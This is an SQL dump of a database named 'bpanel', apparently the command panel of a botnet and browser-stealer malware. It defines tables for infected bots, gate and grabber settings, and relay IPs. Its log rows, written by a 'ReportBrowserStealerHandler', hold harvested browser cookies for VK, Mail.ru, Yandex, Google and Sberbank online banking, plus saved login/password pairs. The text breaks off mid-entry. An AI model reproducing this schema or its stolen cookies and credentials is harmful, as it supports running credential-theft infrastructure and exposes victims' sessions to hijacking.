-- phpMyAdmin SQL Dump
-- version 4.6.6deb5
-- https://www.phpmyadmin.net/
--
-- Хост: localhost:3306
-- Время создания: Янв 10 2021 г., 21:52
-- Версия сервера: 5.7.28-0ubuntu0.18.04.4
-- Версия PHP: 7.2.33-1+ubuntu18.04.1+deb.sury.org+1

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- База данных: `bpanel`
--

-- --------------------------------------------------------

--
-- Структура таблицы `bots`
--

CREATE TABLE `bots` (
  `id` int(11) NOT NULL,
  `botid` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `hwid` text COLLATE utf8mb4_unicode_520_ci,
  `os` varchar(191) COLLATE utf8mb4_unicode_520_ci DEFAULT NULL,
  `cpu` int(3) NOT NULL,
  `ip` varchar(191) COLLATE utf8mb4_unicode_520_ci DEFAULT NULL,
  `last_ip` text COLLATE utf8mb4_unicode_520_ci,
  `layer_ip` text COLLATE utf8mb4_unicode_520_ci,
  `default_browser` text COLLATE utf8mb4_unicode_520_ci,
  `build_version` varchar(191) COLLATE utf8mb4_unicode_520_ci DEFAULT NULL,
  `country` varchar(191) COLLATE utf8mb4_unicode_520_ci DEFAULT NULL,
  `first_login` int(11) UNSIGNED DEFAULT NULL,
  `last_login` int(11) DEFAULT NULL,
  `display_width` varchar(191) COLLATE utf8mb4_unicode_520_ci DEFAULT NULL,
  `architecture` tinyint(4) NOT NULL,
  `computer_name` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `active_modules` mediumtext COLLATE utf8mb4_unicode_520_ci,
  `comment` text COLLATE utf8mb4_unicode_520_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `bots`
--

INSERT INTO `bots` (`id`, `botid`, `hwid`, `os`, `cpu`, `ip`, `last_ip`, `layer_ip`, `default_browser`, `build_version`, `country`, `first_login`, `last_login`, `display_width`, `architecture`, `computer_name`, `active_modules`, `comment`) VALUES
(25, '068619D606E4FF8EB545', NULL, 'Windows 10 Pro', 8, '58.246.141.194', NULL, NULL, NULL, '13', 'CN', 1603085414, 1603094426, '1280x720', 64, 'CAM-L1E01072', NULL, 'Ð²Ð¿Ð½');

-- --------------------------------------------------------

--
-- Структура таблицы `general_settings`
--

CREATE TABLE `general_settings` (
  `id` int(11) NOT NULL,
  `name` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `setting_name` text COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `setting_value` text COLLATE utf8mb4_unicode_520_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `general_settings`
--

INSERT INTO `general_settings` (`id`, `name`, `setting_name`, `setting_value`) VALUES
(1, 'Report Status', 'report_status', '0'),
(2, 'Report Level', 'report_level', '1'),
(3, 'Knock Timeout', 'knock_timeout', '5'),
(4, 'Gate Status', 'gate_status', '1'),
(5, 'Enter Page', 'enter_page', 'XkTdW1e9GA'),
(6, 'Lifetime', 'lifetime', '7');

-- --------------------------------------------------------

--
-- Структура таблицы `http_grabber_settings`
--

CREATE TABLE `http_grabber_settings` (
  `id` int(11) NOT NULL,
  `config` mediumtext COLLATE utf8mb4_unicode_520_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `http_grabber_settings`
--

INSERT INTO `http_grabber_settings` (`id`, `config`) VALUES
(1, 'qwe');

-- --------------------------------------------------------

--
-- Структура таблицы `layers`
--

CREATE TABLE `layers` (
  `id` int(11) NOT NULL,
  `ip` text COLLATE utf8_unicode_520_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_520_ci;

--
-- Дамп данных таблицы `layers`
--

INSERT INTO `layers` (`id`, `ip`, `active`) VALUES
(1, '195.85.219.247', 1),
(2, '185.244.150.205', 1);

-- --------------------------------------------------------

--
-- Структура таблицы `logs`
--

CREATE TABLE `logs` (
  `id` int(11) NOT NULL,
  `controller` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `function` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `log` mediumtext COLLATE utf8mb4_unicode_520_ci NOT NULL,
  `error_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;

--
-- Дамп данных таблицы `logs`
--

INSERT INTO `logs` (`id`, `controller`, `function`, `log`, `error_time`) VALUES
(6, 'ReportBrowserStealerHandler', 'grabDataFromJson (TEST START)', '{\n	\"browsers\":	[{\n			\"browser\":	\"Google Chrome\",\n			\"cookies\":	[\".vk.com 0 / 1 13265784623000000 remixdt -36000\", \".vk.com 0 / 1 13266287803882178 remixlang 1\", \".vk.com 0 / 1 13266719218882446 remixlhk ec031cee8f3fd2ba5b\", \".vk.com 0 / 1 13265784623000000 remixscreen_depth 24\", \".vk.com 0 / 1 13265784623000000 remixscreen_dpr 1\", \".vk.com 0 / 1 13265784623000000 remixscreen_height 975\", \".vk.com 0 / 1 13265784623000000 remixscreen_width 1920\", \".vk.com 0 / 1 13265784623000000 remixscreen_winzoom 1\", \".vk.com 0 / 0 13263019827000000 tmr_lvid f8a3729c9802b290f83a1a16c1c43f49\", \".vk.com 0 / 0 13263019827000000 tmr_lvidTS 1589775027709\", \".vk.com 0 / 0 13263019827000000 tmr_reqNum 1\", \".yadro.ru 0 / 0 13266313195579910 FTID 1UoS712MBwvx1UoS710011Av\", \".mail.ru 1 / 1 13266412648086679 VID 0GO-Qb155DHx00000R0sD4Hx:::0-0-0-3dbd6d4:CAASEC0lbC3k8X_DD93TO6MKe80aYM_t79-Uw4qfUdDn-1jt241K9OxkEpf4gE8vHkftNgYrXLwbs0PxpTCCMTxctb9F97Njof2lDM-SrPP5ndCtczSDLPsruF2SFUO1LTVdO8T_8wjdu1cYxpUAiTBETAkRfQ\", \".yadro.ru 0 / 0 13266313194879445 VID 2Xi0OU0bqHvx1UoS720011DM\", \".mail.ru 0 / 0 13297826242000000 __gads ID=cddb04f0f6e01b41:T=1590280642:S=ALNI_MZtJtgtUvK5CBAk0mVAcX3ZcDSzOA\", \".amazon-adsystem.com 1 / 1 13253971042869173 ad-id A4MqzezoNku-ua20_Egp7Mo\", \".amazon-adsystem.com 1 / 1 13395839842869225 ad-privacy 0\", \".mail.ru 0 / 1 13266326248507520 b 5UcGAJAQNgUAqxUghNU7e8P2nb0hOM3R8BWqYQgAACCc1+CKwokK+CYA\", \".mail.ru 0 / 1 13266326235164790 c wMHJXgEAAHsTAAAUAAAACQAQ\", \".tns-counter.ru 0 / 1 13266326236646311 guid C8CF730A5EC17E14X1589739028\", \".mail.ru 0 / 1 13250342248507571 i AQC/wcleAQBdBgUCAQA=\", \".openx.net 0 / 1 13266326232613361 i 707b88d4-ab27-0c1f-344d-fa3992c6cffc|1590280637\", \".mail.ru 1 / 1 13550150232764845 mrcu 2AD35EC9C1BD75DC94101265DCB9\", \".mail.ru 0 / 0 13266326243244857 o :233:AA==.s\", \".mail.ru 0 / 1 13297862234858562 p 0W8AAB2qQgAA\", \".mail.ru 0 / 1 13266326249000000 s ww=937|wh=831|fver=0\", \".mail.ru 0 / 1 13550150236879821 searchuid 7840494581590280641\", \".mail.ru 0 / 0 13263561448000000 tmr_lvid 0d6a9a0a647e910dd555eadb28c7a52b\", \".mail.ru 0 / 0 13263561448000000 tmr_lvidTS 1590316636735\", \".mail.ru 0 / 0 13263561448000000 tmr_reqNum 6\", \".sberbank.ru 0 / 0 13267565955000000 _ym_d 1591556355\", \".sberbank.ru 0 / 0 13267565955000000 _ym_uid 1591556355852459708\", \".yandex.ru 1 / 1 13551389959073993 i v5Ss2eajRohYpm9Tifeul0ICbyYaF7dE5PSIJ6G+LOb58YDyS/TCY1S59El2Pt9AE9OHAq7vevOqCYIugBWaOJi1lPM=\", \".yandex.ru 0 / 1 13551389960212104 yandexuid 7840494581590280641\", \".yandex.ru 0 / 1 13267565960212176 ymex 1906916364.yrts.1591556364#1906916361.yrtsi.1591556361\", \".yandex.ru 0 / 1 13551389960212152 yuidss 7840494581590280641\", \".google.com 1 /complete/search 0 13251685809056841 CGIC Inx0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45\", \".google.com 1 /search 0 13251685809056865 CGIC Inx0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45\", \".google.com.ua 1 / 1 13251945014319897 NID 204=0Typ66Bqrjt7liEZ6E-jx-pZR5-6C2YCoMR3wfY4V66JAc8ZkUxceZW6oTp1zilmbghoIssr6wxS124L1Ye13rq0bLu_cbUE1rCiDtrwqUfPxWGrERcUBA5NelZArXAmK-2-NHgD-Vk89hnWnBou95cL0h13BkcU9HPeKDwMXOM\", \"www.sberbank.ru 0 / 1 13267669552901736 BBTracking MjA=\", \".sberbank.ru 0 / 0 13791957247000000 Segmento_UID YUuuZzJ8rIIZ\", \"www.sberbank.ru 0 / 1 13266891952901717 anonymousUserId 315ac997-00b3-4444-9e76-126b589d20be\", \".sberbank.ru 0 / 0 13243909925000000 _fbp fb.1.1591660325358.22249772\", \".facebook.com 1 / 1 13243909928725015 fr 04ygV2GsEiFlSKWee..Be3s9f...1.0.Be3s9f.\", \".sberbank.ru 0 / 0 13322533925000000 last_visit 1591635125258::1591660325258\", \".mts.ru 0 / 0 13547173918339991 mts_id 86e1fb4b-d892-4bff-b655-bec3bb9eff1a\", \".mts.ru 0 / 0 13547173918340027 mts_id_last_sync 1591660372\", \".rambler.ru 0 / 0 13790390100892620 proto_uid 1CIAAGLP3l4iKrhbAWqf7wB=\", \".rambler.ru 0 / 1 13790390100892582 ruid 1CIAAGLP3l4iKrhbAWqf7wB=\", \".sberbank.ru 0 / 0 13322533925000000 top100_id t1.3122244.1756656542.1591660325255\", \".google.com 0 / 0 13790390403592833 CONSENT WP.2879ae.28844e\", \".google.com 1 /verify 1 13253575684317923 SNID APx-0P06Ib2DBKJU_9ylnhwHShtylZmmIJZVaoDGz_Hm33U8f2x8zCfaeedGbgSH6cVN3dNripy8g6R-ClXT\", \".google.com 0 / 1 13240365670000000 1P_JAR 2020-6-27-23\", \".google.com 1 / 1 13299205256720333 ANID AHWqTUlU6Sz5uCLL-R_WYZeAHi34xyYYYkdQxvm-qZ0LUnm3rFCzZX90jjr0Y78w\", \".doubleclick.net 1 / 1 13268450244177232 IDE AHWqTUlFl8H6nLr1YJTneab1MQydXq5kyf95j17OZWTUGxJVTD2Pw4EjaTcgLfuy\", \".sberbank.ru 0 / 0 13238107521000000 _ym_isad 2\", \".google.com 1 / 1 13253857131754810 NID 204=L24jdZirgSVCxsOBhu0z_GnWjJFCjWh-tYVFp5p2biZ_EJUbNUQRuy-5PjNUNMPthuEfM7j3RebznWBZlEjn6FElBfTgHTrcc_Fk_vW3Igh4orSWNHdve2MmUgIOFVplnDXRaNNN7nuGASjGvPmHGLPqAP8vFx99vmKQsgdZJaY\", \"scr.online.sberbank.ru 0 / 1 13269582547652961 cfids2 E8+QZQU67LsgVegbH74+UnbY8njoVojq5S5X2RSngwDxROXN//ZJI+naERCxJ3h0Ybe7fO054t7EkjTjKOdWg9ZQwACre+wjgQpVd9FNXeVZvX8pwbnwQJppALKRHW7wX1yWDAGLJDlpqK9qhEE6FcGiC72Dngu8Q32dK/I=\", \".rutarget.ru 0 / 1 13253598553637300 userId YUuuZzJ8rIIZ\", \".sberbank.ru 0 / 0 13238048932000000 _gat 1\", \".sberbank.ru 0 / 0 13238048932000000 _gat_ua211694381 1\", \"online.sberbank.ru 0 / 0 13791957247000000 Segmento_UID YUuuZzJ8rIIZ\", \"online.sberbank.ru 0 / 0 0 TS012cf864 013ade28994a7ab8e3f49518ac3d95c725ffe615f1841c5b2f6ffa1d23771b82e63095d318d637d2530e05f15efe5256bae25fccde\", \"online.sberbank.ru 0 / 0 0 TS012cf864001 01b44903ab063b370a214fc804214aee3409967734fae066cc14fc2f582f82bd623ba36d8a1706b76da78bc13aec8166b2df4fbad9\", \".sberbank.ru 0 / 0 13269584884000000 __zzat2 MDA0dBA=Fz2+aQ==\", \".sberbank.ru 0 / 0 13301120883000000 _ga GA1.2.577123051.1591556353\", \".sberbank.ru 0 / 0 13238135283000000 _gid GA1.2.2030719841.1593561921\", \".sberbank.ru 0 / 0 13269584884000000 cfids2 E8+QZQU67LsgVegbH74+UnbY8njoVojq5S5X2RSngwDxROXN//ZJI+naERCxJ3h0Ybe7fO054t7EkjTjKOdWg9ZQwACre+wjgQpVd9FNXeVZvX8pwbnwQJppALKRHW7wX1yWDAGLJDlpqK9qhEE6FcGiC72Dngu8Q32dK/I=\"],\n			\"accounts\":	[{\n					\"service\":	\"https://login.vk.com/\",\n					\"login\":	\"putin\",\n					\"password\":	\"vvp_228\"\n				}, {\n					\"service\":	\"https://login.vk.com/\",\n					\"login\":	\"putin\",\n					\"password\":	\"vvp_228\"\n				}]\n		}]\n}', '2020-07-01 12:37:57'),
(7, 'ReportBrowserStealerHandler', 'grabDataFromJson (TEST START)', '02553B5FF1C837559555', '2020-07-01 12:40:05'),
(8, 'ReportBrowserStealerHandler', 'grabDataFromJson (TEST END)', '{\n	\"browsers\":	[{\n			\"browser\":	\"Google Chrome\",\n			\"cookies\":	[\".vk.com 0 / 1 13265784623000000 remixdt -36000\", \".vk.com 0 / 1 13266287803882178 remixlang 1\", \".vk.com 0 / 1 13266719218882446 remixlhk ec031cee8f3fd2ba5b\", \".vk.com 0 / 1 13265784623000000 remixscreen_depth 24\", \".vk.com 0 / 1 13265784623000000 remixscreen_dpr 1\", \".vk.com 0 / 1 13265784623000000 remixscreen_height 975\", \".vk.com 0 / 1 13265784623000000 remixscreen_width 1920\", \".vk.com 0 / 1 13265784623000000 remixscreen_winzoom 1\", \".vk.com 0 / 0 13263019827000000 tmr_lvid f8a3729c9802b290f83a1a16c1c43f49\", \".vk.com 0 / 0 13263019827000000 tmr_lvidTS 1589775027709\", \".vk.com 0 / 0 13263019827000000 tmr_reqNum 1\", \".yadro.ru 0 / 0 13266313195579910 FTID 1UoS712MBwvx1UoS710011Av\", \".mail.ru 1 / 1 13266412648086679 VID 0GO-Qb155DHx00000R0sD4Hx:::0-0-0-3dbd6d4:CAASEC0lbC3k8X_DD93TO6MKe80aYM_t79-Uw4qfUdDn-1jt241K9OxkEpf4gE8vHkftNgYrXLwbs0PxpTCCMTxctb9F97Njof2lDM-SrPP5ndCtczSDLPsruF2SFUO1LTVdO8T_8wjdu1cYxpUAiTBETAkRfQ\", \".yadro.ru 0 / 0 13266313194879445 VID 2Xi0OU0bqHvx1UoS720011DM\", \".mail.ru 0 / 0 13297826242000000 __gads ID=cddb04f0f6e01b41:T=1590280642:S=ALNI_MZtJtgtUvK5CBAk0mVAcX3ZcDSzOA\", \".amazon-adsystem.com 1 / 1 13253971042869173 ad-id A4MqzezoNku-ua20_Egp7Mo\", \".amazon-adsystem.com 1 / 1 13395839842869225 ad-privacy 0\", \".mail.ru 0 / 1 13266326248507520 b 5UcGAJAQNgUAqxUghNU7e8P2nb0hOM3R8BWqYQgAACCc1+CKwokK+CYA\", \".mail.ru 0 / 1 13266326235164790 c wMHJXgEAAHsTAAAUAAAACQAQ\", \".tns-counter.ru 0 / 1 13266326236646311 guid C8CF730A5EC17E14X1589739028\", \".mail.ru 0 / 1 13250342248507571 i AQC/wcleAQBdBgUCAQA=\", \".openx.net 0 / 1 13266326232613361 i 707b88d4-ab27-0c1f-344d-fa3992c6cffc|1590280637\", \".mail.ru 1 / 1 13550150232764845 mrcu 2AD35EC9C1BD75DC94101265DCB9\", \".mail.ru 0 / 0 13266326243244857 o :233:AA==.s\", \".mail.ru 0 / 1 13297862234858562 p 0W8AAB2qQgAA\", \".mail.ru 0 / 1 13266326249000000 s ww=937|wh=831|fver=0\", \".mail.ru 0 / 1 13550150236879821 searchuid 7840494581590280641\", \".mail.ru 0 / 0 13263561448000000 tmr_lvid 0d6a9a0a647e910dd555eadb28c7a52b\", \".mail.ru 0 / 0 13263561448000000 tmr_lvidTS 1590316636735\", \".mail.ru 0 / 0 13263561448000000 tmr_reqNum 6\", \".sberbank.ru 0 / 0 13267565955000000 _ym_d 1591556355\", \".sberbank.ru 0 / 0 13267565955000000 _ym_uid 1591556355852459708\", \".yandex.ru 1 / 1 13551389959073993 i v5Ss2eajRohYpm9Tifeul0ICbyYaF7dE5PSIJ6G+LOb58YDyS/TCY1S59El2Pt9AE9OHAq7vevOqCYIugBWaOJi1lPM=\", \".yandex.ru 0 / 1 13551389960212104 yandexuid 7840494581590280641\", \".yandex.ru 0 / 1 13267565960212176 ymex 1906916364.yrts.1591556364#1906916361.yrtsi.1591556361\", \".yandex.ru 0 / 1 13551389960212152 yuidss 7840494581590280641\", \".google.com 1 /complete/search 0 13251685809056841 CGIC Inx0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45\", \".google.com 1 /search 0 13251685809056865 CGIC Inx0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45\", \".google.com.ua 1 / 1 13251945014319897 NID 204=0Typ66Bqrjt7liEZ6E-jx-pZR5-6C2YCoMR3wfY4V66JAc8ZkUxceZW6oTp1zilmbghoIssr6wxS124L1Ye13rq0bLu_cbUE1rCiDtrwqUfPxWGrERcUBA5NelZArXAmK-2-NHgD-Vk89hnWnBou95cL0h13BkcU9HPeKDwMXOM\", \"www.sberbank.ru 0 / 1 13267669552901736 BBTracking MjA=\", \".sberbank.ru 0 / 0 13791957247000000 Segmento_UID YUuuZzJ8rIIZ\", \"www.sberbank.ru 0 / 1 13266891952901717 anonymousUserId 315ac997-00b3-4444-9e76-126b589d20be\", \".sberbank.ru 0 / 0 13243909925000000 _fbp fb.1.1591660325358.22249772\", \".facebook.com 1 / 1 13243909928725015 fr 04ygV2GsEiFlSKWee..Be3s9f...1.0.Be3s9f.\", \".sberbank.ru 0 / 0 13322533925000000 last_visit 1591635125258::1591660325258\", \".mts.ru 0 / 0 13547173918339991 mts_id 86e1fb4b-d892-4bff-b655-bec3bb9eff1a\", \".mts.ru 0 / 0 13547173918340027 mts_id_last_sync 1591660372\", \".rambler.ru 0 / 0 13790390100892620 proto_uid 1CIAAGLP3l4iKrhbAWqf7wB=\", \".rambler.ru 0 / 1 13790390100892582 ruid 1CIAAGLP3l4iKrhbAWqf7wB=\", \".sberbank.ru 0 / 0 13322533925000000 top100_id t1.3122244.1756656542.1591660325255\", \".google.com 0 / 0 13790390403592833 CONSENT WP.2879ae.28844e\", \".google.com 1 /verify 1 13253575684317923 SNID APx-0P06Ib2DBKJU_9ylnhwHShtylZmmIJZVaoDGz_Hm33U8f2x8zCfaeedGbgSH6cVN3dNripy8g6R-ClXT\", \".google.com 0 / 1 13240365670000000 1P_JAR 2020-6-27-23\", \".google.com 1 / 1 13299205256720333 ANID AHWqTUlU6Sz5uCLL-R_WYZeAHi34xyYYYkdQxvm-qZ0LUnm3rFCzZX90jjr0Y78w\", \".doubleclick.net 1 / 1 13268450244177232 IDE AHWqTUlFl8H6nLr1YJTneab1MQydXq5kyf95j17OZWTUGxJVTD2Pw4EjaTcgLfuy\", \".sberbank.ru 0 / 0 13238107521000000 _ym_isad 2\", \".google.com 1 / 1 13253857131754810 NID 204=L24jdZirgSVCxsOBhu0z_GnWjJFCjWh-tYVFp5p2biZ_EJUbNUQRuy-5PjNUNMPthuEfM7j3RebznWBZlEjn6FElBfTgHTrcc_Fk_vW3Igh4orSWNHdve2MmUgIOFVplnDXRaNNN7nuGASjGvPmHGLPqAP8vFx99vmKQsgdZJaY\", \"scr.online.sberbank.ru 0 / 1 13269582547652961 cfids2 E8+QZQU67LsgVegbH74+UnbY8njoVojq5S5X2RSngwDxROXN//ZJI+naERCxJ3h0Ybe7fO054t7EkjTjKOdWg9ZQwACre+wjgQpVd9FNXeVZvX8pwbnwQJppALKRHW7wX1yWDAGLJDlpqK9qhEE6FcGiC72Dngu8Q32dK/I=\", \".rutarget.ru 0 / 1 13253598553637300 userId YUuuZzJ8rIIZ\", \".sberbank.ru 0 / 0 13238048932000000 _gat 1\", \".sberbank.ru 0 / 0 13238048932000000 _gat_ua211694381 1\", \"online.sberbank.ru 0 / 0 13791957247000000 Segmento_UID YUuuZzJ8rIIZ\", \"online.sberbank.ru 0 / 0 0 TS012cf864 013ade28994a7ab8e3f49518ac3d95c725ffe615f1841c5b2f6ffa1d23771b82e63095d318d637d2530e05f15efe5256bae25fccde\", \"online.sberbank.ru 0 / 0 0 TS012cf864001 01b44903ab063b370a214fc804214aee3409967734fae066cc14fc2f582f82bd623ba36d8a1706b76da78bc13aec8166b2df4fbad9\", \".sberbank.ru 0 / 0 13269584884000000 __zzat2 MDA0dBA=Fz2+aQ==\", \".sberbank.ru 0 / 0 13301120883000000 _ga GA1.2.577123051.1591556353\", \".sberbank.ru 0 / 0 13238135283000000 _gid GA1.2.2030719841.1593561921\", \".sberbank.ru 0 / 0 13269584884000000 cfids2 E8+QZQU67LsgVegbH74+UnbY8njoVojq5S5X2RSngwDxROXN//ZJI+naERCxJ3h0Ybe7fO054t7EkjTjKOdWg9ZQwACre+wjgQpVd9FNXeVZvX8pwbnwQJppALKRHW7wX1yWDAGLJDlpqK9qhEE6FcGiC72Dngu8Q32dK/I=\"],\n			\"accounts\":	[{\n					\"service\":	\"https://login.vk.com/\",\n					\"login\":	\"putin\",\n					\"password\":	\"vvp_228\"\n				}, {\n					\"service\":	\"https://login.vk.com/\",\n					\"login\":	\"putin\",\n					\"password\":	\"vvp_228\"\n				}]\n		}]\n}', '2020-07-01 12:40:05'),
(9, 'ReportBrowserStealerHandler', 'grabDataFromJson (TEST START)', '02553B5FF1C837559555', '2020-07-01 12:45:12'),
(10, 'ReportBrowserStealerHandler', 'grabDataFromJson (TEST END)', '{\n	\"browsers\":	[{\n			\"browser\":	\"Google Chrome\",\n			\"cookies\":	[\".vk.com 0 / 1 13265784623000000 remixdt -36000\", \".vk.com 0 / 1 13266287803882178 remixlang 1\", \".vk.com 0 / 1 13266719218882446 remixlhk ec031cee8f3fd2ba5b\", \".vk.com 0 / 1 13265784623000000 remixscreen_depth 24\", \".vk.com 0 / 1 13265784623000000 remixscreen_dpr 1\", \".vk.com 0 / 1 13265784623000000 remixscreen_height 975\", \".vk.com 0 / 1 13265784623000000 remixscreen_width 1920\", \".vk.com 0 / 1 13265784623000000 remixscreen_winzoom 1\", \".vk.com 0 / 0 13263019827000000 tmr_lvid f8a3729c9802b290f83a1a16c1c43f49\", \".vk.com 0 / 0 13263019827000000 tmr_lvidTS 1589775027709\", \".vk.com 0 / 0 13263019827000000 tmr_reqNum 1\", \".yadro.ru 0 / 0 13266313195579910 FTID 1UoS712MBwvx1UoS710011Av\", \".mail.ru 1 / 1 13266412648086679 VID 0GO-Qb155DHx00000R0sD4Hx:::0-0-0-3dbd6d4:CAASEC0lbC3k8X_DD93TO6MKe80aYM_t79-Uw4qfUdDn-1jt241K9OxkEpf4gE8vHkftNgYrXLwbs0PxpTCCMTxctb9F97Njof2lDM-SrPP5ndCtczSDLPsruF2SFUO1LTVdO8T_8wjdu1cYxpUAiTBETAkRfQ\", \".yadro.ru 0 / 0 13266313194879445 VID 2Xi0OU0bqHvx1UoS720011DM\", \".mail.ru 0 / 0 13297826242000000 __gads ID=cddb04f0f6e01b41:T=1590280642:S=ALNI_MZtJtgtUvK5CBAk0mVAcX3ZcDSzOA\", \".amazon-adsystem.com 1 / 1 13253971042869173 ad-id A4MqzezoNku-ua20_Egp7Mo\", \".amazon-adsystem.com 1 / 1 13395839842869225 ad-privacy 0\", \".mail.ru 0 / 1 13266326248507520 b 5UcGAJAQNgUAqxUghNU7e8P2nb0hOM3R8BWqYQgAACCc1+CKwokK+CYA\", \".mail.ru 0 / 1 13266326235164790 c wMHJXgEAAHsTAAAUAAAACQAQ\", \".tns-counter.ru 0 / 1 13266326236646311 guid C8CF730A5EC17E14X1589739028\", \".mail.ru 0 / 1 13250342248507571 i AQC/wcleAQBdBgUCAQA=\", \".openx.net 0 / 1 13266326232613361 i 707b88d4-ab27-0c1f-344d-fa3992c6cffc|1590280637\", \".mail.ru 1 / 1 13550150232764845 mrcu 2AD35EC9C1BD75DC94101265DCB9\", \".mail.ru 0 / 0 13266326243244857 o :233:AA==.s\", \".mail.ru 0 / 1 13297862234858562 p 0W8AAB2qQgAA\", \".mail.ru 0 / 1 13266326249000000 s ww=937|wh=831|fver=0\", \".mail.ru 0 / 1 13550150236879821 searchuid 7840494581590280641\", \".mail.ru 0 / 0 13263561448000000 tmr_lvid 0d6a9a0a647e910dd555eadb28c7a52b\", \".mail.ru 0 / 0 13263561448000000 tmr_lvidTS 1590316636735\", \".mail.ru 0 / 0 13263561448000000 tmr_reqNum 6\", \".sberbank.ru 0 / 0 13267565955000000 _ym_d 1591556355\", \".sberbank.ru 0 / 0 13267565955000000 _ym_uid 1591556355852459708\", \".yandex.ru 1 / 1 13551389959073993 i v5Ss2eajRohYpm9Tifeul0ICbyYaF7dE5PSIJ6G+LOb58YDyS/TCY1S59El2Pt9AE9OHAq7vevOqCYIugBWaOJi1lPM=\", \".yandex.ru 0 / 1 13551389960212104 yandexuid 7840494581590280641\", \".yandex.ru 0 / 1 13267565960212176 ymex 1906916364.yrts.1591556364#1906916361.yrtsi.1591556361\", \".yandex.ru 0 / 1 13551389960212152 yuidss 7840494581590280641\", \".google.com 1 /complete/search 0 13251685809056841 CGIC Inx0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45\", \".google.com 1 /search 0 13251685809056865 CGIC Inx0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45\", \".google.com.ua 1 / 1 13251945014319897 NID 204=0Typ66Bqrjt7liEZ6E-jx-pZR5-6C2YCoMR3wfY4V66JAc8ZkUxceZW6oTp1zilmbghoIssr6wxS124L1Ye13rq0bLu_cbUE1rCiDtrwqUfPxWGrERcUBA5NelZArXAmK-2-NHgD-Vk89hnWnBou95cL0h13BkcU9HPeKDwMXOM\", \"www.sberbank.ru 0 / 1 13267669552901736 BBTracking MjA=\", \".sberbank.ru 0 / 0 13791957247000000 Segmento_UID YUuuZzJ8rIIZ\", \"www.sberbank.ru 0 / 1 13266891952901717 anonymousUserId 315ac997-00b3-4444-9e76-126b589d20be\", \".sberbank.ru 0 / 0 13243909925000000 _fbp fb.1.1591660325358.22249772\", \".facebook.com 1 / 1 13243909928725015 fr 04ygV2GsEiFlSKWee..Be3s9f...1.0.Be3s9f.\", \".sberbank.ru 0 / 0 13322533925000000 last_visit 1591635125258::1591660325258\", \".mts.ru 0 / 0 13547173918339991 mts_id 86e1fb4b-d892-4bff-b655-bec3bb9eff1a\", \".mts.ru 0 / 0 13547173918340027 mts_id_last_sync 1591660372\", \".rambler.ru 0 / 0 13790390100892620 proto_uid 1CIAAGLP3l4iKrhbAWqf7wB=\", \".rambler.ru 0 / 1 13790390100892582 ruid 1CIAAGLP3l4iKrhbAWqf7wB=\", \".sberbank.ru 0 / 0 13322533925000000 top100_id t1.3122244.1756656542.1591660325255\", \".google.com 0 / 0 13790390403592833 CONSENT WP.2879ae.28844e\", \".google.com 1 /verify 1 13253575684317923 SNID APx-0P06Ib2DBKJU_9ylnhwHShtylZmmIJZVaoDGz_Hm33U8f2x8zCfaeedGbgSH6cVN3dNripy8g6R-ClXT\", \".google.com 0 / 1 13240365670000000 1P_JAR 2020-6-27-23\", \".google.com 1 / 1 13299205256720333 ANID AHWqTUlU6Sz5uCLL-R_WYZeAHi34xyYYYkdQxvm-qZ0LUnm3rFCzZX90jjr0Y78w\", \".doubleclick.net 1 / 1 13268450244177232 IDE 